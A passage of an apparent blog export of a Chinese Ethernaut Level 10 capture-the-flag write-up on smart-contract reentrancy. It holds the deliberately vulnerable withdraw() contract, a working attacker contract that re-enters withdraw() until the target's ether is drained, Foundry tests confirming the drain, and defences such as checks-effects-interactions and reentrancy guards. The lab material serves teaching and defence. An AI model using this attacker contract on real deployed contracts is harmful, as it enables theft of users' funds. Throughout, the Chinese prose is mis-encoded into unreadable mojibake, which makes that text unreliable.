è¾“å‡ºåº”è¯¥æ˜¾ç¤ºåˆçº¦ä½™é¢è¢«å®Œå…¨æç©º\n```\n\n## ğŸ›¡ï¸ é˜²å¾¡æªæ–½\n\n### 1. CEI æ¨¡å¼ (Check-Effects-Interactions)\n\n```solidity\ncontract SecureReentrance {\n    mapping(address => uint) public balances;\n    \n    function withdraw(uint _amount) public {\n        // âœ… æ£€æŸ¥ (Check)\n        require(balances[msg.sender] >= _amount, \"Insufficient balance\");\n        \n        // âœ… æ•ˆæœ (Effect) - å…ˆæ›´æ–°çŠ¶æ€\n        balances[msg.sender] -= _amount;\n        \n        // âœ… äº¤äº’ (Interaction) - æœ€åè¿›è¡Œå¤–éƒ¨è°ƒç”¨\n        (bool success,) = msg.sender.call{value: _amount}(\"\");\n        require(success, \"Transfer failed\");\n    }\n}\n```\n\n### 2. é‡å…¥é” (Reentrancy Guard)\n\n```solidity\ncontract ReentrancyGuarded {\n    bool private locked;\n    mapping(address => uint) public balances;\n    \n    modifier noReentrant() {\n        require(!locked, \"Reentrant call\");\n        locked = true;\n        _;\n        locked = false;\n    }\n    \n    function withdraw(uint _amount) public noReentrant {\n        require(balances[msg.sender] >= _amount, \"Insufficient balance\");\n        \n        balances[msg.sender] -= _amount;\n        (bool success,) = msg.sender.call{value: _amount}(\"\");\n        require(success, \"Transfer failed\");\n    }\n}\n```\n\n### 3. ä½¿ç”¨ OpenZeppelin çš„ ReentrancyGuard\n\n```solidity\nimport \"@openzeppelin/contracts/security/ReentrancyGuard.sol\";\n\ncontract SafeContract is ReentrancyGuard {\n    mapping(address => uint) public balances;\n    \n    function withdraw(uint _amount) public nonReentrant {\n        require(balances[msg.sender] >= _amount, \"Insufficient balance\");\n        \n        balances[msg.sender] -= _amount;\n        (bool success,) = msg.sender.call{value: _amount}(\"\");\n        require(success, \"Transfer failed\");\n    }\n}\n```\n\n### 4. ä½¿ç”¨ transfer() è€Œé call()\n\n```solidity\n// âš ï¸ æœ‰é™é˜²æŠ¤ï¼ˆä¸æ¨èä½œä¸ºå”¯ä¸€é˜²æŠ¤æªæ–½ï¼‰\nfunction withdraw(uint _amount) public {\n    require(balances[msg.sender] >= _amount, \"Insufficient balance\");\n    \n    balances[msg.sender] -= _amount;\n    payable(msg.sender).transfer(_amount); // é™åˆ¶ Gas ä¸º 2300\n}\n```\n\n## ğŸ“š æ ¸å¿ƒçŸ¥è¯†ç‚¹\n\n### 1. é‡å…¥æ”»å‡»ç±»å‹\n\n| ç±»å‹ | æè¿° | ç¤ºä¾‹ |\n|------|------|------|\n| **å•å‡½æ•°é‡å…¥** | æ”»å‡»åŒä¸€ä¸ªå‡½æ•° | æœ¬å…³å¡çš„ `withdraw()` |\n| **è·¨å‡½æ•°é‡å…¥** | æ”»å‡»ä¸åŒå‡½æ•° | `withdraw()` â†’ `transfer()` |\n| **è·¨åˆçº¦é‡å…¥** | æ”»å‡»ä¸åŒåˆçº¦ | DeFi åè®®é—´çš„å¤æ‚é‡å…¥ |\n\n### 2. Gas é™åˆ¶å¯¹æ¯”\n\n```solidity\n// transfer/send: 2300 gas (ä¸è¶³ä»¥è¿›è¡Œé‡å…¥)\npayable(msg.sender).transfer(amount);\n\n// call: è½¬å‘æ‰€æœ‰å‰©ä½™ gas (å¯èƒ½å¯¼è‡´é‡å…¥)\n(bool success,) = msg.sender.call{value: amount}(\"\");\n```\n\n### 3. çŠ¶æ€æ›´æ–°æ—¶åº\n\n```solidity\n// âŒ é”™è¯¯æ¨¡å¼\nfunction vulnerable() public {\n    require(condition);        // Check\n    externalCall();           // Interaction (å±é™©!)\n    updateState();            // Effect (å¤ªæ™šäº†)\n}\n\n// âœ… æ­£ç¡®æ¨¡å¼\nfunction secure() public {\n    require(condition);        // Check\n    updateState();            // Effect (å…ˆæ›´æ–°çŠ¶æ€)\n    externalCall();           // Interaction (å®‰å…¨)\n}\n```\n\n## ğŸ›ï¸ å†å²æ¡ˆä¾‹\n\n### The DAO æ”»å‡» (2016å¹´6æœˆ)\n\n- **æŸå¤±**: 360ä¸‡ ETH (å½“æ—¶ä»·å€¼çº¦6000ä¸‡ç¾å…ƒ)\n- **åŸå› **: splitDAO å‡½æ•°å­˜åœ¨é‡å…¥æ¼æ´\n- **åæœ**: ä»¥å¤ªåŠç¡¬åˆ†å‰ï¼Œäº§ç”Ÿ ETH å’Œ ETC\n- **æ•™è®­**: é‡å…¥æ”»å‡»çš„ç ´åæ€§å’Œé˜²æŠ¤é‡è¦æ€§\n\n### å…¶ä»–è‘—åæ¡ˆä¾‹\n\n1. **Cream Finance** (2021) - 1.3äº¿ç¾å…ƒæŸå¤±\n2. **bZx Protocol** (2020) - å¤šæ¬¡é‡å…¥æ”»å‡»\n3. **Uniswap V1** (æ—©æœŸç‰ˆæœ¬) - ç†è®ºæ¼æ´\n\n## ğŸ¯ æ€»ç»“\n\né‡å…¥æ”»å‡»æ˜¯æ™ºèƒ½åˆçº¦å®‰å…¨çš„åŸºçŸ³çŸ¥è¯†ï¼š\n\n- âœ… **ç†è§£ CEI æ¨¡å¼çš„é‡è¦æ€§**\n- âœ… **æŒæ¡å¤šç§é˜²æŠ¤æªæ–½çš„ä½¿ç”¨**\n- âœ… **è®¤è¯†çŠ¶æ€ç®¡ç†çš„å…³é”®æ€§**\n- âœ… **å­¦ä¹ å†å²æ¡ˆä¾‹çš„æ•™è®­**\n\né‡å…¥æ”»å‡»çœ‹ä¼¼ç®€å•ï¼Œä½†å…¶å˜ç§å’Œç»„åˆå½¢å¼åœ¨ç°ä»£ DeFi åè®®ä¸­ä»ç„¶æ˜¯ä¸»è¦å¨èƒã€‚æŒæ¡å…¶åŸç†å’Œé˜²æŠ¤æªæ–½æ˜¯æ¯ä¸ªæ™ºèƒ½åˆçº¦å¼€å‘è€…çš„å¿…ä¿®è¯¾ã€‚\n\n---\n\n## ğŸ”— ç›¸å…³é“¾æ¥\n\n- **[ä¸Šä¸€å…³: Level 9 - King](/2025/01/25/ethernaut-level-09-king/)**\n- **[ä¸‹ä¸€å…³: Level 11 - Elevator](/2025/01/25/ethernaut-level-11-elevator/)**\n- **[ç³»åˆ—ç›®å½•: Ethernaut Foundry Solutions](/2025/01/25/ethernaut-foundry-solutions-series/)**\n- **[GitHub é¡¹ç›®](https://github.com/XuHugo/Ethernaut-Foundry-Solutions)**\n\n---\n\n*å®‰å…¨çš„åˆçº¦ä¸ä»…è¦åšæ­£ç¡®çš„äº‹ï¼Œè¿˜è¦ä»¥æ­£ç¡®çš„é¡ºåºåšäº‹ã€‚* ğŸ”","slug":"ethernaut-level-10-reentrancy","published":1,"comments":1,"layout":"post","photos":[],"_id":"cmfc7zbp9000wbf5qb8kma8or","content":"<h1 id=\"ğŸ¯-Ethernaut-Level-10-Re-entrancy-ç»å…¸é‡å…¥æ”»å‡»è¯¦è§£\"><a href=\"#ğŸ¯-Ethernaut-Level-10-Re-entrancy-ç»å…¸é‡å…¥æ”»å‡»è¯¦è§£\" class=\"headerlink\" title=\"ğŸ¯ Ethernaut Level 10: Re-entrancy - ç»å…¸é‡å…¥æ”»å‡»è¯¦è§£\"></a>ğŸ¯ Ethernaut Level 10: Re-entrancy - ç»å…¸é‡å…¥æ”»å‡»è¯¦è§£</h1><blockquote>\n<p><strong>å…³å¡é“¾æ¥</strong>: <a href=\"https://ethernaut.openzeppelin.com/level/10\">Ethernaut Level 10 - Re-entrancy</a><br><strong>æ”»å‡»ç±»å‹</strong>: é‡å…¥æ”»å‡» (Reentrancy Attack)<br><strong>éš¾åº¦</strong>: â­â­â­â­â˜†<br><strong>å†å²å½±å“</strong>: The DAO æ”»å‡»äº‹ä»¶ (2016å¹´)</p>\n</blockquote>\n<h2 id=\"ğŸ“‹-æŒ‘æˆ˜ç›®æ ‡\"><a href=\"#ğŸ“‹-æŒ‘æˆ˜ç›®æ ‡\" class=\"headerlink\" title=\"ğŸ“‹ æŒ‘æˆ˜ç›®æ ‡\"></a>ğŸ“‹ æŒ‘æˆ˜ç›®æ ‡</h2><p>è¿™æ˜¯æ™ºèƒ½åˆçº¦å®‰å…¨é¢†åŸŸæœ€ç»å…¸çš„æ”»å‡»ç±»å‹ä¹‹ä¸€ï¼š</p>\n<ol>\n<li><strong>çªƒå–åˆçº¦èµ„é‡‘</strong> - æå–è¶…è¿‡è‡ªå·±å­˜æ¬¾é‡‘é¢çš„ä»¥å¤ªå¸</li>\n<li><strong>ç†è§£é‡å…¥åŸç†</strong> - æŒæ¡çŠ¶æ€æ›´æ–°æ—¶åºé—®é¢˜</li>\n<li><strong>å­¦ä¹ é˜²æŠ¤æªæ–½</strong> - äº†è§£å¦‚ä½•ç¼–å†™å®‰å…¨çš„ææ¬¾å‡½æ•°</li>\n</ol>\n<h2 id=\"ğŸ”-æ¼æ´åˆ†æ\"><a href=\"#ğŸ”-æ¼æ´åˆ†æ\" class=\"headerlink\" title=\"ğŸ” æ¼æ´åˆ†æ\"></a>ğŸ” æ¼æ´åˆ†æ</h2><h3 id=\"åˆçº¦æºç åˆ†æ\"><a href=\"#åˆçº¦æºç åˆ†æ\" class=\"headerlink\" title=\"åˆçº¦æºç åˆ†æ\"></a>åˆçº¦æºç åˆ†æ</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pragma solidity ^0.6.12;</span><br><span class=\"line\"></span><br><span class=\"line\">import &quot;openzeppelin-contracts-06/math/SafeMath.sol&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">contract Reentrance &#123;</span><br><span class=\"line\">  </span><br><span class=\"line\">  using SafeMath for uint256;</span><br><span class=\"line\">  mapping(address =&gt; uint) public balances;</span><br><span class=\"line\"></span><br><span class=\"line\">  function donate(address _to) public payable &#123;</span><br><span class=\"line\">    balances[_to] = balances[_to].add(msg.value);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  function balanceOf(address _who) public view returns (uint balance) &#123;</span><br><span class=\"line\">    return balances[_who];</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  // ğŸš¨ æ¼æ´å‡½æ•°</span><br><span class=\"line\">  function withdraw(uint _amount) public &#123;</span><br><span class=\"line\">    if(balances[msg.sender] &gt;= _amount) &#123;</span><br><span class=\"line\">      (bool result,) = msg.sender.call&#123;value:_amount&#125;(&quot;&quot;);</span><br><span class=\"line\">      if(result) &#123;</span><br><span class=\"line\">        balances[msg.sender] -= _amount;  // âŒ çŠ¶æ€æ›´æ–°åœ¨å¤–éƒ¨è°ƒç”¨ä¹‹å</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"æ¼æ´è¯†åˆ«\"><a href=\"#æ¼æ´è¯†åˆ«\" class=\"headerlink\" title=\"æ¼æ´è¯†åˆ«\"></a>æ¼æ´è¯†åˆ«</h3><p>é‡å…¥æ”»å‡»çš„æ ¹æœ¬åŸå› æ˜¯ <strong>æ£€æŸ¥-æ•ˆæœ-äº¤äº’ (CEI)</strong> æ¨¡å¼çš„è¿åï¼š</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function withdraw(uint _amount) public &#123;</span><br><span class=\"line\">    // âœ… æ£€æŸ¥ (Check)</span><br><span class=\"line\">    if(balances[msg.sender] &gt;= _amount) &#123;</span><br><span class=\"line\">        </span><br><span class=\"line\">        // âŒ äº¤äº’ (Interaction) - è¿‡æ—©è¿›è¡Œå¤–éƒ¨è°ƒç”¨</span><br><span class=\"line\">        (bool result,) = msg.sender.call&#123;value:_amount&#125;(&quot;&quot;);</span><br><span class=\"line\">        </span><br><span class=\"line\">        if(result) &#123;</span><br><span class=\"line\">            // âŒ æ•ˆæœ (Effect) - çŠ¶æ€æ›´æ–°å¤ªæ™š</span><br><span class=\"line\">            balances[msg.sender] -= _amount;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"æ”»å‡»åŸç†\"><a href=\"#æ”»å‡»åŸç†\" class=\"headerlink\" title=\"æ”»å‡»åŸç†\"></a>æ”»å‡»åŸç†</h3><ol>\n<li><strong>æ¶æ„åˆçº¦å­˜æ¬¾</strong> - å‘ç›®æ ‡åˆçº¦å­˜å…¥å°‘é‡èµ„é‡‘</li>\n<li><strong>è°ƒç”¨ææ¬¾å‡½æ•°</strong> - è§¦å‘ <code>withdraw()</code> å‡½æ•°</li>\n<li><strong>æ¥æ”¶å›è°ƒ</strong> - åœ¨ <code>call</code> æ‰§è¡Œæ—¶è§¦å‘æ¶æ„åˆçº¦çš„ <code>receive()</code> å‡½æ•°</li>\n<li><strong>é€’å½’è°ƒç”¨</strong> - åœ¨çŠ¶æ€æ›´æ–°å‰å†æ¬¡è°ƒç”¨ <code>withdraw()</code></li>\n<li><strong>é‡å¤æå–</strong> - ç”±äºä½™é¢æœªæ›´æ–°ï¼Œå¯ä»¥å¤šæ¬¡æå–èµ„é‡‘</li>\n</ol>\n<h3 id=\"æ”»å‡»æµç¨‹å›¾\"><a href=\"#æ”»å‡»æµç¨‹å›¾\" class=\"headerlink\" title=\"æ”»å‡»æµç¨‹å›¾\"></a>æ”»å‡»æµç¨‹å›¾</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ç”¨æˆ·è°ƒç”¨ withdraw(1 ether)</span><br><span class=\"line\">    â†“</span><br><span class=\"line\">æ£€æŸ¥ balances[attacker] &gt;= 1 ether âœ…</span><br><span class=\"line\">    â†“</span><br><span class=\"line\">å‘é€ 1 ether åˆ°æ”»å‡»è€…åˆçº¦</span><br><span class=\"line\">    â†“</span><br><span class=\"line\">æ”»å‡»è€…åˆçº¦çš„ receive() è¢«è§¦å‘</span><br><span class=\"line\">    â†“</span><br><span class=\"line\">å†æ¬¡è°ƒç”¨ withdraw(1 ether)</span><br><span class=\"line\">    â†“</span><br><span class=\"line\">æ£€æŸ¥ balances[attacker] &gt;= 1 ether âœ… (ä½™é¢æœªæ›´æ–°!)</span><br><span class=\"line\">    â†“</span><br><span class=\"line\">å†æ¬¡å‘é€ 1 ether...</span><br><span class=\"line\">    â†“</span><br><span class=\"line\">å¦‚æ­¤é‡å¤ï¼Œç›´åˆ°åˆçº¦ä½™é¢è€—å°½</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"ğŸ’»-Foundry-å®ç°\"><a href=\"#ğŸ’»-Foundry-å®ç°\" class=\"headerlink\" title=\"ğŸ’» Foundry å®ç°\"></a>ğŸ’» Foundry å®ç°</h2><h3 id=\"æ”»å‡»åˆçº¦ä»£ç \"><a href=\"#æ”»å‡»åˆçº¦ä»£ç \" class=\"headerlink\" title=\"æ”»å‡»åˆçº¦ä»£ç \"></a>æ”»å‡»åˆçº¦ä»£ç </h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// SPDX-License-Identifier: MIT</span><br><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">import &quot;forge-std/Test.sol&quot;;</span><br><span class=\"line\">import &quot;../src/Reentrance.sol&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">contract ReentrancyAttacker &#123;</span><br><span class=\"line\">    Reentrance public target;</span><br><span class=\"line\">    uint public amount;</span><br><span class=\"line\">    </span><br><span class=\"line\">    constructor(address _target) &#123;</span><br><span class=\"line\">        target = Reentrance(_target);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function attack() external payable &#123;</span><br><span class=\"line\">        amount = msg.value;</span><br><span class=\"line\">        </span><br><span class=\"line\">        // æ­¥éª¤1: å…ˆå­˜å…¥ä¸€äº›èµ„é‡‘å»ºç«‹ä½™é¢</span><br><span class=\"line\">        target.donate&#123;value: amount&#125;(address(this));</span><br><span class=\"line\">        </span><br><span class=\"line\">        // æ­¥éª¤2: å¼€å§‹é‡å…¥æ”»å‡»</span><br><span class=\"line\">        target.withdraw(amount);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    // é‡å…¥æ”»å‡»çš„æ ¸å¿ƒ - receiveå‡½æ•°</span><br><span class=\"line\">    receive() external payable &#123;</span><br><span class=\"line\">        if (address(target).balance &gt;= amount) &#123;</span><br><span class=\"line\">            // é€’å½’è°ƒç”¨withdrawï¼Œå®ç°é‡å…¥</span><br><span class=\"line\">            target.withdraw(amount);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function getBalance() public view returns (uint) &#123;</span><br><span class=\"line\">        return address(this).balance;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">contract ReentranceTest is Test &#123;</span><br><span class=\"line\">    Reentrance public reentrance;</span><br><span class=\"line\">    ReentrancyAttacker public attacker;</span><br><span class=\"line\">    </span><br><span class=\"line\">    address public user1 = makeAddr(&quot;user1&quot;);</span><br><span class=\"line\">    address public user2 = makeAddr(&quot;user2&quot;);</span><br><span class=\"line\">    address public attackerAddr = makeAddr(&quot;attacker&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">    function setUp() public &#123;</span><br><span class=\"line\">        // éƒ¨ç½²ç›®æ ‡åˆçº¦</span><br><span class=\"line\">        reentrance = new Reentrance();</span><br><span class=\"line\">        </span><br><span class=\"line\">        // ç»™ç”¨æˆ·ä¸€äº›åˆå§‹èµ„é‡‘</span><br><span class=\"line\">        vm.deal(user1, 10 ether);</span><br><span class=\"line\">        vm.deal(user2, 10 ether);</span><br><span class=\"line\">        vm.deal(attackerAddr, 2 ether);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // æ¨¡æ‹Ÿæ­£å¸¸ç”¨æˆ·å­˜æ¬¾</span><br><span class=\"line\">        vm.prank(user1);</span><br><span class=\"line\">        reentrance.donate&#123;value: 5 ether&#125;(user1);</span><br><span class=\"line\">        </span><br><span class=\"line\">        vm.prank(user2);</span><br><span class=\"line\">        reentrance.donate&#123;value: 5 ether&#125;(user2);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // éƒ¨ç½²æ”»å‡»åˆçº¦</span><br><span class=\"line\">        vm.prank(attackerAddr);</span><br><span class=\"line\">        attacker = new ReentrancyAttacker(address(reentrance));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function testReentrancyAttack() public &#123;</span><br><span class=\"line\">        uint256 contractBalanceBefore = address(reentrance).balance;</span><br><span class=\"line\">        uint256 attackerBalanceBefore = attackerAddr.balance;</span><br><span class=\"line\">        </span><br><span class=\"line\">        console.log(&quot;åˆçº¦ä½™é¢ (æ”»å‡»å‰):&quot;, contractBalanceBefore);</span><br><span class=\"line\">        console.log(&quot;æ”»å‡»è€…ä½™é¢ (æ”»å‡»å‰):&quot;, attackerBalanceBefore);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // æ‰§è¡Œé‡å…¥æ”»å‡»</span><br><span class=\"line\">        vm.prank(attackerAddr);</span><br><span class=\"line\">        attacker.attack&#123;value: 1 ether&#125;();</span><br><span class=\"line\">        </span><br><span class=\"line\">        uint256 contractBalanceAfter = address(reentrance).balance;</span><br><span class=\"line\">        uint256 attackerBalanceAfter = attacker.getBalance();</span><br><span class=\"line\">        </span><br><span class=\"line\">        console.log(&quot;åˆçº¦ä½™é¢ (æ”»å‡»å):&quot;, contractBalanceAfter);</span><br><span class=\"line\">        console.log(&quot;æ”»å‡»è€…ä½™é¢ (æ”»å‡»å):&quot;, attackerBalanceAfter);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // éªŒè¯æ”»å‡»æˆåŠŸ</span><br><span class=\"line\">        assertEq(contractBalanceAfter, 0);</span><br><span class=\"line\">        assertGt(attackerBalanceAfter, 1 ether); // è·å¾—è¶…è¿‡æŠ•å…¥çš„èµ„é‡‘</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function testReentrancyDetails() public &#123;</span><br><span class=\"line\">        vm.prank(attackerAddr);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // è®°å½•æ¯æ¬¡withdrawè°ƒç”¨</span><br><span class=\"line\">        vm.recordLogs();</span><br><span class=\"line\">        attacker.attack&#123;value: 1 ether&#125;();</span><br><span class=\"line\">        </span><br><span class=\"line\">        // éªŒè¯æ”»å‡»è€…çš„ä½™é¢è®°å½•</span><br><span class=\"line\">        assertEq(reentrance.balanceOf(address(attacker)), 0); // æœ€ç»ˆä½™é¢ä¸º0</span><br><span class=\"line\">        assertEq(address(reentrance).balance, 0); // åˆçº¦è¢«æç©º</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"è¿è¡Œæµ‹è¯•\"><a href=\"#è¿è¡Œæµ‹è¯•\" class=\"headerlink\" title=\"è¿è¡Œæµ‹è¯•\"></a>è¿è¡Œæµ‹è¯•</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># è¿è¡Œé‡å…¥æ”»å‡»æµ‹è¯•</span></span><br><span class=\"line\">forge <span class=\"built_in\">test</span> --match-contract ReentranceTest -vvv</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># è¾“å‡ºåº”è¯¥æ˜¾ç¤ºåˆçº¦ä½™é¢è¢«å®Œå…¨æç©º</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"ğŸ›¡ï¸-é˜²å¾¡æªæ–½\"><a href=\"#ğŸ›¡ï¸-é˜²å¾¡æªæ–½\" class=\"headerlink\" title=\"ğŸ›¡ï¸ é˜²å¾¡æªæ–½\"></a>ğŸ›¡ï¸ é˜²å¾¡æªæ–½</h2><h3 id=\"1-CEI-æ¨¡å¼-Check-Effects-Interactions\"><a href=\"#1-CEI-æ¨¡å¼-Check-Effects-Interactions\" class=\"headerlink\" title=\"1. CEI æ¨¡å¼ (Check-Effects-Interactions)\"></a>1. CEI æ¨¡å¼ (Check-Effects-Interactions)</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract SecureReentrance &#123;</span><br><span class=\"line\">    mapping(address =&gt; uint) public balances;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function withdraw(uint _amount) public &#123;</span><br><span class=\"line\">        // âœ… æ£€æŸ¥ (Check)</span><br><span class=\"line\">        require(balances[msg.sender] &gt;= _amount, &quot;Insufficient balance&quot;);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // âœ… æ•ˆæœ (Effect) - å…ˆæ›´æ–°çŠ¶æ€</span><br><span class=\"line\">        balances[msg.sender] -= _amount;</span><br><span class=\"line\">        </span><br><span class=\"line\">        // âœ… äº¤äº’ (Interaction) - æœ€åè¿›è¡Œå¤–éƒ¨è°ƒç”¨</span><br><span class=\"line\">        (bool success,) = msg.sender.call&#123;value: _amount&#125;(&quot;&quot;);</span><br><span class=\"line\">        require(success, &quot;Transfer failed&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-é‡å…¥é”-Reentrancy-Guard\"><a href=\"#2-é‡å…¥é”-Reentrancy-Guard\" class=\"headerlink\" title=\"2. é‡å…¥é” (Reentrancy Guard)\"></a>2. é‡å…¥é” (Reentrancy Guard)</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract ReentrancyGuarded &#123;</span><br><span class=\"line\">    bool private locked;</span><br><span class=\"line\">    mapping(address =&gt; uint) public balances;</span><br><span class=\"line\">    </span><br><span class=\"line\">    modifier noReentrant() &#123;</span><br><span class=\"line\">        require(!locked, &quot;Reentrant call&quot;);</span><br><span class=\"line\">        locked = true;</span><br><span class=\"line\">        _;</span><br><span class=\"line\">        locked = false;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function withdraw(uint 